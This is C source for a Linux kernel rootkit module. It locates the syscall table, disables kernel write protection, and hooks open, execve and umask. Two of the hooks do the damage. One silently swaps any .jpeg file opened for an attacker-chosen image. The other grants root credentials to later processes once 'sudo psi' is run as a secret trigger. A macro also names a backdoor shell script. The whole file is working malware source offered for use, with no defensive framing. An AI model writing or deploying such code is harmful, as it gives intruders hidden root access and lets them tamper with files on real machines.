/** 				ψ kernel module 			*/
#include "/usr/src/linux-headers-4.15.0-112/include/linux/module.h"
#include "/usr/src/linux-headers-4.15.0-112/include/linux/kernel.h"
#include "/usr/src/linux-headers-4.15.0-142/include/linux/kallsyms.h"
#include "/usr/src/linux-headers-4.15.0-142/include/linux/kprobes.h"
#include "/usr/src/linux-headers-4.15.0-142/include/linux/syscalls.h"
#include "linux/init.h"	 	/* Needed for the macros */

int unlocked = 0;

MODULE_LICENSE("GPL");
MODULE_AUTHOR("tyl3rdurd3n");
MODULE_DESCRIPTION("E|ψ>=H|ψ>");
MODULE_VERSION("3.1415926535897932384626433");

static char* hook_filename = "/home/virtual/Pictures/rm.jpeg";
module_param(hook_filename, charp, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
MODULE_PARM_DESC(hook_filename, "wubalubadubdub");

// Macros to enable changing the syscall table through control register
#define DISABLE_WRITE_PROTECTION (write_cr0(read_cr0() & (~ 0x10000)))
#define ENABLE_WRITE_PROTECTION (write_cr0(read_cr0() | 0x10000))
#define HELLO_FRIEND "/bin/bash /home/virtual/Desktop/bkdoor.sh"

asmlinkage unsigned long **sys_call_table;

/* Function Prototypes */
static unsigned long **find_sys_call_table(void);
asmlinkage int hooked_umask(mode_t umask);
asmlinkage long hooked_open(const char __user *filename, int flags, umode_t mode);
asmlinkage int hooked_execve(const char* file,const char* const argv[],const char* const envp[]);
asmlinkage int (*original_umask)(mode_t umask);
asmlinkage long (*original_sys_open)(const char __user *, int, umode_t);
asmlinkage int (*original_execve)(const char* file,const char* const argv[],const char* const envp[]);


static int __init psi_start(void){
	printk(KERN_INFO "<<ψ>>\t%s", "ENTANGLED");
	// Get The Address of SYSCALL_TABLE	
	sys_call_table = find_sys_call_table();

    	if(!sys_call_table) {/* operation not permitted */
		printk(KERN_ERR "Couldn't find sys_call_table.\n");
		return -EPERM;  
    	}
	
	// change value in CR0
	DISABLE_WRITE_PROTECTION;
	
	// Place Hooks 
	original_sys_open = (void *) sys_call_table[__NR_open];
	original_execve = (void *) sys_call_table[__NR_execve];
	original_umask = (void *) sys_call_table[__NR_umask];
	sys_call_table[__NR_umask] = (unsigned long*) hooked_umask;
	sys_call_table[__NR_open] = (unsigned long*) hooked_open;
	sys_call_table[__NR_execve] = (unsigned long*) hooked_execve;
	// Change the value back in CR0
	ENABLE_WRITE_PROTECTION;
	return 0;
}


static void __exit psi_end(void){
	printk(KERN_INFO "<< ψ Collapsed >>");
	
	/* Restore original values in syscall table */
    	DISABLE_WRITE_PROTECTION;
	sys_call_table[__NR_open] = (unsigned long *) original_sys_open;
	sys_call_table[__NR_execve] = (unsigned long *) original_execve;
	sys_call_table[__NR_umask] = (unsigned long *) original_umask;
	ENABLE_WRITE_PROTECTION;
}


static unsigned long **find_sys_call_table() {
    unsigned long offset;
    unsigned long **sct;

    for(offset=PAGE_OFFSET; offset<ULLONG_MAX; offset+=sizeof(void *)) {
	sct = (unsigned long **) offset;
	if(sct[__NR_close] == (unsigned long *) sys_close)
	    return sct;
    }
    return NULL;
}

/* 			HOOKS SYS_OPEN				*/
asmlinkage long hooked_open(const char __user *filename, int flags,umode_t mode){
	int len = strlen(filename);
	// If its image file, replace it with our image
	if(strcmp(filename + len - 5,".jpeg")){
		return (*original_sys_open)(filename, flags, mode);
	}else{
		printk(KERN_INFO "Attempting to override open(%s)",filename);
		mm_segment_t old_fs;
		long fd;
		
		old_fs = get_fs();
		set_fs(KERNEL_DS);
		
		fd = (*original_sys_open)(hook_filename,flags,mode);
		set_fs(old_fs);
		return fd;
	}
}

asmlinkage int hooked_execve(const char *file, const char *const argv[], const char *const envp[]){
	
	int nargin = sizeof(argv)/sizeof(const char);
	if(nargin > 1){
		printk(KERN_INFO "%s %s",file, argv[1]);
		if(strcmp(file,"/usr/bin/sudo")==0){
			if(strcmp(argv[1],"psi")==0){
				unlocked = 1;
			}
		}
	}
	if(unlocked == 1){
		printk(KERN_INFO "Enjoy Root :D");
		// technique taken from PinkP4nther/Sutekh code, very slick
		struct cred *np;
		kuid_t newuid;
		newuid.val = 0; // :D
		np = prepare_creds();
		/* Set uid of new cred struct to 0 */
		np->uid = newuid;
		/* Set euid of new cred struct to 0 */
		np->euid = newuid;
		/* Commit cred to task_struct of process */
		commit_creds(np);
	}
	// Hand execution back to execve
	return original_execve(file, argv, envp);
}

// Should hook the setuid function to always work for username psi
asmlinkage int hooked_umask(mode_t umask){
	// need some kind of flag to know whether to give automatic root
	printk(KERN_INFO "Someone wants root...");

	//if (unlocked == 0){ unlocked = 1; }
	//else{ unlocked = 0; }

	return original_umask(umask);
}

module_init(psi_start);
module_exit(psi_end);
